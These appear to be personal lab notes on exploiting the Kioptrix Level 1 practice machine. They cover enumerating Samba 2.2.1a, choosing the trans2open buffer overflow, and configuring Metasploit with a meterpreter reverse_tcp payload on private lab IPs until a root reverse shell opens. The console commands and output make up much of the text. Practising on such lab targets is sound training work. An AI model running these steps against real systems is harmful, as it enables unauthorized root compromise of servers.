
**Exploit kioptrix level 1**

ATTACKING SMB<br/>
<br/>
-------------------------------------------------------<br/>
From Enumeration<br/>
<br/>
port 139 (SMB)<br/>
139/tcp  open netbios-ssn Samba smbd (workgroup: MYGROUP)<br/>
Unix (Samba 2.2.1a)<br/>
<br/>
Google &gt; Samba 2.2.1a exploit<br/>
exploit DB<br/>
https://www.exploit-db.com/exploits/10<br/>
https://www.exploit-db.com/exploits/7<br/>
<br/>
rapid 7 (metasploit)<br/>
https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/<br/>
NOTE<br/>
Description<br/>
<br/>
This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they<b>apparently do not allow anonymous access to IPC</b><br/>
WE tested and DID have anon access to IPC. CHECK!<br/>
<br/>
<br/>
---------------------------------------------------------------------------------<br/>
<br/>
Victim - 192.168.247.129<br/>
attacker - 192.168.247.128<br/>
<br/>
<br/>
<br/>
SEARCHSPLOIT &lt;query&gt;<br/>
<br/>
searchspolit samba 2.2<br/>
<br/>
<img height="250" src="image.png" width="594"/><br/>
<br/>
Probable a 'trans2open' attack<br/>
<br/>
BOOT UP METASPLOIT<br/>
<br/>
search for 'trans2open' inside metasploit &gt;&gt; during enum a rapid 7 link was identified.<br/>
<br/>
<img height="150" src="image 2.png" width="498"/><br/>
<br/>
During enum it was identifed the system was running redhat &gt; thus linux so option 1 for linux x86<br/>
<br/>
view options<br/>
<br/>
set RHOSTS &lt;victim IP&gt;<br/>
<br/>
check IP was set<br/>
<br/>
msf6 &gt; use 1<br/>
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp<br/>
msf6 exploit(linux/samba/trans2open) &gt; options<br/>
<br/>
Module options (exploit/linux/samba/trans2open):<br/>
<br/>
 Name  Current Setting Required Description<br/>
 ----  --------------- -------- -----------<br/>
 RHOSTS          yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi<br/>
                   t<br/>
 RPORT  139       yes    The target port (TCP)<br/>
<br/>
<br/>
Payload options (linux/x86/meterpreter/reverse_tcp):<br/>
<br/>
 Name  Current Setting Required Description<br/>
 ----  --------------- -------- -----------<br/>
 LHOST 192.168.247.128 yes    The listen address (an interface may be specified)<br/>
 LPORT 4444       yes    The listen port<br/>
<br/>
<br/>
Exploit target:<br/>
<br/>
 Id Name<br/>
 -- ----<br/>
 0  Samba 2.2.x - Bruteforce<br/>
<br/>
<br/>
msf6 exploit(linux/samba/trans2open) &gt; set RHOSTS 192.168.247.129<br/>
RHOSTS =&gt; 192.168.247.129<br/>
msf6 exploit(linux/samba/trans2open) &gt; options<br/>
<br/>
Module options (exploit/linux/samba/trans2open):<br/>
<br/>
 Name  Current Setting Required Description<br/>
 ----  --------------- -------- -----------<br/>
 RHOSTS 192.168.247.129 yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi<br/>
                   t<br/>
 RPORT  139       yes    The target port (TCP)<br/>
<br/>
<br/>
Payload options (linux/x86/meterpreter/reverse_tcp):<br/>
<br/>
 Name  Current Setting Required Description<br/>
 ----  --------------- -------- -----------<br/>
 LHOST 192.168.247.128 yes    The listen address (an interface may be specified)<br/>
 LPORT 4444       yes    The listen port<br/>
<br/>
<br/>
Exploit target:<br/>
<br/>
 Id Name<br/>
 -- ----<br/>
 0  Samba 2.2.x - Bruteforce<br/>
<br/>
<br/>
<br/>
NOTE &gt;&gt;&gt; Default meterpreter ports will prob get picked up...<br/>
<br/>
<br/>
Run or exploit<br/>
<br/>
<img src="image 3.png"/><br/>
<br/>
Sessions dieing &gt; time to cancel and check options<br/>
<br/>
<br/>
Second time checking options after payload did not work meterpreter offeres payload options<br/>
<br/>
<img height="250" src="image 4.png" width="602"/><br/>
<br/>
Current paylaod is staged &gt;&gt;&gt; see the ///<br/>
<br/>
<img height="150" src="image 5.png" width="612"/><br/>
<br/>
change payload to non staged &gt; check with options<br/>
<br/>
exploit!<br/>
<br/>
<img height="400" src="image 6.png" width="693"/><br/>
<br/>
Reverese shell with root access!!!!<br/>
<br/>
<br/>
